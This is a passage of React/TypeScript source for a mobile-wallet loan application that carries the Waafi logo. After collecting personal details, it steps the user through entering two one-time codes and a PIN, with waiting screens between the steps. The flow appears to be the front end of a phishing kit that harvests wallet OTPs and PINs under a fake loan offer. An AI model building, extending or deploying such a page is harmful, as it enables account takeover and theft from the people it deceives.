          <p className="text-sm text-muted-foreground mt-2 font-medium">
            {t("select_loan_type")}
          </p>
        </div>
        <div className="grid grid-cols-1 gap-3">
          {options.map((o) => (
            <button
              key={o.key}
              type="button"
              onClick={() => onSelect(o.key)}
              className="group flex items-start gap-4 rounded-xl border border-input bg-card px-4 py-4 text-left hover:border-primary hover:bg-primary/5 transition-colors"
            >
              <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-primary/10 text-xl">
                {o.icon}
              </div>
              <div className="flex-1 min-w-0">
                <div className="font-semibold text-foreground">{o.title}</div>
                <div className="text-xs text-muted-foreground mt-0.5">{o.desc}</div>
              </div>
              <span className="text-muted-foreground group-hover:text-primary self-center">→</span>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

function ReviewBox({
  data,
  amount,
  months,
  interest,
  calc,
  loading,
  onConfirm,
  onEdit,
  t,
}: {
  data: {
    full_name: string;
    email: string;
    phone: string;
    monthly_income: number;
    purpose: string;
  };
  amount: number;
  months: number;
  interest: number;
  calc: { monthly: number; total: number; interestPaid: number };
  loading: boolean;
  onConfirm: () => void;
  onEdit: () => void;
  t: (k: keyof typeof TRANSLATIONS) => string;
}) {
  const Row = ({ label, value }: { label: string; value: React.ReactNode }) => (
    <div className="flex justify-between gap-4 py-1.5 border-b last:border-b-0">
      <span className="text-sm text-muted-foreground">{label}</span>
      <span className="text-sm font-medium text-right break-words">{value}</span>
    </div>
  );
  return (
    <div className="space-y-4">
      <p className="text-sm text-muted-foreground">
        {t("please_review")}
      </p>
      <div className="rounded-md border p-4">
        <Row label={t("full_name")} value={data.full_name} />
        <Row label={t("email")} value={data.email} />
        <Row label={t("phone")} value={data.phone} />
        <Row label={t("monthly_income")} value={usd(data.monthly_income)} />
        <Row label={t("loan_amount")} value={usd(amount)} />
        <Row label={t("term")} value={`${months} ${t("months_unit")}`} />
        <Row label={t("interest_rate")} value={`${interest.toFixed(2)}%`} />
        <Row label={t("monthly_payment")} value={usd(calc.monthly)} />
        <Row label={t("total_repayment")} value={usd(calc.total)} />
        <Row
          label={t("purpose")}
          value={<span className="whitespace-pre-wrap">{data.purpose}</span>}
        />
      </div>
      <div className="flex gap-3">
        <Button variant="outline" onClick={onEdit} disabled={loading} className="flex-1">
          {t("edit")}
        </Button>
        <Button onClick={onConfirm} disabled={loading} className="flex-1">
          {loading ? t("submitting") : t("confirm_submit")}
        </Button>
      </div>
    </div>
  );
}

function stageTitle(status: string, t: (k: keyof typeof TRANSLATIONS) => string) {
  switch (status) {
    case "submitted":
      return t("app_under_review");
    case "otp1_required":
    case "otp1_submitted":
      return t("step1");
    case "pin_required":
    case "pin_submitted":
      return t("step2");
    case "otp2_required":
    case "otp2_submitted":
      return t("step3");
    case "completed":
      return t("approved");
    case "rejected":
      return t("rejected");
    default:
      return t("apply_minutes");
  }
}

function WaitingBox({ label }: { label: string }) {
  return (
    <div className="py-8 text-center space-y-3">
      <div className="mx-auto h-8 w-8 animate-spin rounded-full border-2 border-muted-foreground border-t-transparent" />
      <p className="text-sm text-muted-foreground">{label}</p>
    </div>
  );
}

function StepForm({
  label,
  onSubmit,
  loading,
  type = "text",
  length,
  onResend,
  error,
  onClearError,
  t,
}: {
  label: string;
  onSubmit: (value: string) => void;
  loading: boolean;
  type?: string;
  length: number;
  onResend?: () => void;
  error?: string;
onClearError?: () => void;
  t: (k: keyof typeof TRANSLATIONS) => string;
}) {
  const [value, setValue] = useState("");
  const isValid = new RegExp(`^\\d{${length}}$`).test(value);
  return (
    <form
      onSubmit={(e) => {
        e.preventDefault();
        if (isValid) onSubmit(value);
      }}
      className="space-y-4"
    >
      <div className="space-y-2">
  <Label htmlFor="step_value">{label}</Label>

  {error && (
    <div className="rounded-md border border-red-500 bg-red-50 px-3 py-2 text-sm text-red-600">
      {error}
    </div>
  )}

  <Input
  id="step_value"
  className={error ? "border-red-500 focus-visible:ring-red-500" : ""}
          type={type}
          inputMode="numeric"
          pattern={`\\d{${length}}`}
          autoComplete="one-time-code"
          value={value}
          onChange={(e) => {
  const newValue = e.target.value
    .replace(/\D/g, "")
    .slice(0, length);
if (error && onClearError) {
  onClearError();
}
  setValue(newValue);

  if (newValue.length === length && !loading) {
    onSubmit(newValue);
  }
}}
          required
          minLength={length}
          maxLength={length}
          autoFocus
        />
      </div>
      <Button type="submit" disabled={loading || !isValid} className="w-full">
        {loading ? t("submitting") : t("submit")}
      </Button>
      {onResend && (
        <div className="text-center">
          <button
            type="button"
            onClick={onResend}
            disabled={loading}
            className="text-sm text-primary hover:underline disabled:opacity-50"
          >
            {t("resend_otp")}
          </button>
        </div>
      )}
    </form>
  );
}

function humanizeError(err: unknown, fallback: string): string {
  if (!(err instanceof Error)) return fallback;
  const msg = err.message ?? "";
  // TanStack server fn errors often come back as JSON arrays of Zod issues
  if (msg.trim().startsWith("[")) {
    try {
      const parsed = JSON.parse(msg);
      if (Array.isArray(parsed) && parsed[0]?.message) {
        const field = String(parsed[0].path?.[0] ?? "");
        const labels: Record<string, string> = {
          full_name: "Full name",
          email: "Email",
          phone: "Phone",
          amount: "Loan amount",
          purpose: "Purpose",
          monthly_income: "Monthly income",
          months: "Term",
          interest_rate: "Interest rate",
          value: "Code",
        };
        const label = labels[field] ?? field ?? "Input";
        return `${label}: ${parsed[0].message}`;
      }
    } catch {
      /* ignore */
    }
  }
  return msg || fallback;
}

function Splash({ logoUrl = "/waafi-logo.png", tagline = "Loans direct to your Waafi wallet" }: { logoUrl?: string; tagline?: string }) {
  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-background animate-in fade-in">
      <img
        src={logoUrl}
        alt="Splash"
        className="w-56 max-w-[60%] animate-pulse"
      />
      <p className="mt-6 text-sm text-muted-foreground">
        {tagline}
      </p>
    </div>
  );
}

function SuccessBox({ onReset, t }: { onReset: () => void; t: (k: keyof typeof TRANSLATIONS) => string }) {
  return (
    <div className="space-y-4 text-center py-8">
      <p className="text-lg font-medium">{t("success_msg")}</p>
      <Button onClick={onReset}>{t("start_new")}</Button>
    </div>
  );
}

function RejectedBox({ onReset, t }: { onReset: () => void; t: (k: keyof typeof TRANSLATIONS) => string }) {
  return (
    <div className="space-y-4 text-center py-8">
      <p className="text-lg font-medium text-destructive">{t("rejected_msg")}</p>
      <Button variant="outline" onClick={onReset}>{t("try_again")}</Button>
    </div>
  );
}
